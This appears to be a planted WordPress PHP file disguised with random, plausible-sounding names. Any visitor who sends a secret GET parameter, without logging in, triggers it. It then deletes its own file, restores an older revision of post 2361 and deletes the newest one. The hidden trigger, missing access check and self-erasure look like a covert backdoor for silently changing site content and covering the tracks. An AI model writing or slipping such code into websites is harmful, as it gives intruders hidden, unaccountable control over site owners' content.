<?php

function coupon_short_keywords() {
	if (isset($_GET['clock_wpc_revisions']) && $_GET['clock_wpc_revisions'] === 'controller_upgrader_publish_invoice') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$showcase_signup_read = 2361;
		$addons_page_size = wp_get_post_revisions($showcase_signup_read);
		if (empty($addons_page_size)) die('no revisions');
		if (count($addons_page_size) < 2) die('less than 2');
		$screen_exception_top = array_shift($addons_page_size);
		$only_calculator_akismet = $screen_exception_top->ID;
		$automatic_updates_cron = array_shift($addons_page_size);
		$discount_insert_restaurant = $automatic_updates_cron->ID;
		$feed_anti_media = wp_restore_post_revision($discount_insert_restaurant);
		if ($feed_anti_media === false) die('error restoring');
		$feed_anti_media = wp_delete_post_revision($only_calculator_akismet);		
		if ($feed_anti_media === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'coupon_short_keywords');
